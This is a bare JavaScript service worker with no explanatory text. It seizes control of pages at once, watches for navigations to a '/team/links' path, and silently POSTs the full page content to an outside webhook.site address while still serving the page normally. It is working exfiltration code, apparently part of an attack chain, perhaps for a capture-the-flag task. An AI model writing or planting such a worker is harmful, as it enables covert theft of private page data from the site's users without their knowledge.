const C = "https://webhook.site/4451235e-7729-4edc-9435-a587f7c83cd4";

self.addEventListener("install", e => self.skipWaiting());

self.addEventListener("activate", e => e.waitUntil(
  self.registration.navigationPreload.enable().then(() => self.clients.claim())
));

self.addEventListener("fetch", e => {
  if (e.request.mode !== "navigate" || !e.request.url.endsWith("/team/links")) return;
  e.respondWith((async () => {
    const r = await e.preloadResponse;
    await fetch(C, { method: "POST", mode: "no-cors", body: await r.clone().text() });
    return r;
  })());
});
